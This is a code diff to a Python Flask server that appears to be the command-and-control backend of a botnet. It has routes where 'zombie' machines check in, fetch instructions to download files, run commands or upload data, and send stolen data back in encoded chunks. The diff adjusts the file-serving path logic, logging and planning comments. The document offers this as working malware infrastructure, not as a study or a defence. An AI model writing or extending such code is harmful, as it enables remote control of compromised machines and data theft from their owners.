@@ -37,7 +37,7 @@ class Server:
         self.db = Database()
         logger.debug("DB initialized")
         # Setup Flask App settings. 
-        self.app.config['UPLOAD_FOLDER'] = 'files/post/'
+        #self.app.config['UPLOAD_FOLDER'] = 'files/post/'
 
         # ROOT_PATH is for where the webserver templates live. 
         #self.app.config['ROOT_PATH'] = base_path # not sure if this is needed
@@ -104,8 +104,8 @@ class Server:
             # ZOMBIE PAGES
             - landing page for checkins -> DONE
                 - if instruction is available, redirect based on request types (download, run cmd, upload, etc)
-            - A page to handles pulling data from zombie -> DONE
-            - A page that handles pushing data to zombies -> DONE 
+            - A page to handles pulling data from zombie -> INPROG
+            - A page that handles pushing data to zombies -> INPROG 
             - TO_ADD:
                 - Some form of Zombie Auth.
 
@@ -276,20 +276,25 @@ class Server:
                     auth = self.db.is_authd(auth_token)
                     logger.debug(f"auth is {auth}")
                     if auth:
-                        try:
-                            zombieID = filename.split("-")[0]
-                            home_dir = self.base_path / "files" / "zombies" / zombieID
-                            if home_dir.exists():
-                                upload_dir = home_dir / zombieID / "post"
-                            else:
-                                logger.error("Zombie ID not found!!")
-                        except Exception as e:
-                            logger.error(f"Exception occured: {e}")
+                        # try:
+                        zombieID = filename.split("-")[0]
+                        fName = filename.split("-")[1]
+                        logger.debug(f"Found zombieID: {zombieID}")
+                        home_dir = Path(self.base_path)
+                        home_dir = home_dir  / "files" / "zombies" / zombieID
+                        logger.debug(f"home_dir is: {home_dir}")
+                        if home_dir.exists():
+                            upload_dir = home_dir / "post"
+                        else:
+                            logger.error("Zombie ID not found!!")
+                            return redirect("/login", 302)
+                        # except Exception as e:
+                        #     logger.error(f"Exception occured: {e}")
                         # uploads = path.join(self.app.config['ROOT_PATH'], self.app.config['UPLOAD_FOLDER'])
                         logger.debug(f"UPLOADING FROM: {upload_dir}")
-                        file = f"{filename}"
-                        print(f"file is {upload_dir}/{file}")
-                        return send_from_directory(upload_dir, file)
+                        #file = f"{filename}"
+                        #print(f"file is {upload_dir}/{file}")
+                        return send_from_directory(upload_dir, fName)
                     else:
                         logger.debug(f"TOKEN: {auth_token} INVALID")
                         return redirect("/login", 302)
@@ -310,6 +315,7 @@ class Server:
         """
         @self.app.route("/checkin", methods=['POST'])                                  
         def checkin():
+            # I want to change this so that a unique url is generated for each checkin. 
             logger.info(f"Recieved {request.method} request to /checkin from {request.remote_addr}")
             content = request.get_json()
             zombieID = content['X-Client-ID']
@@ -357,7 +363,7 @@ class Server:
                     return jsonify(body), 500     
             else:
                 con.close()
-                logger.debug(f"CCould not find zombieID: {zombieID} and 'X-Client-Version' is {request.cookie.get('X-Client-Version')}")
+                logger.debug(f"Could not find zombieID: {zombieID} and 'X-Client-Version' is {request.cookie.get('X-Client-Version')}")
                 con.close()
                 return make_response("<h1>Info Not Found</h1>", 403)
             
@@ -366,12 +372,6 @@ class Server:
         - Recieve data from client and store in database
         - If 'file' command is recieved, server has zombie fetch file and recieves it whole
             or in chunks depending on file size. 
-            - Server saves file or chunks to ./files/pre/zombieID
-            - Server decodes file from ./files/pre and saves to ./files/post/zombieID-token
-            - Server deletes file from ./files/pre/zombieID
-            - Server sends command to get file
-            - zombie grabs file, encodes, then sends in pages if too large.
-
             - server saves file or chunks to ./files/zombieID/pre/token
             - server decodes file from ./files/zombieID/pre/token and saves to ./files/zombieID/post/token
             - server sends command to get file
@@ -383,7 +383,7 @@ class Server:
         def sendto():
             logger.info(f"Recieved {request.method} request to /sendto from {request.remote_addr}")
             content = request.get_json()
-            logger.debug(f"found content: {content}")
+            logger.debug(f"found content: X-Client-ID={content['X-Client-ID']}, Chunk: {content['data'][0:10]}")
             data = content['data']
             zombieID = content['X-Client-ID']
             try:
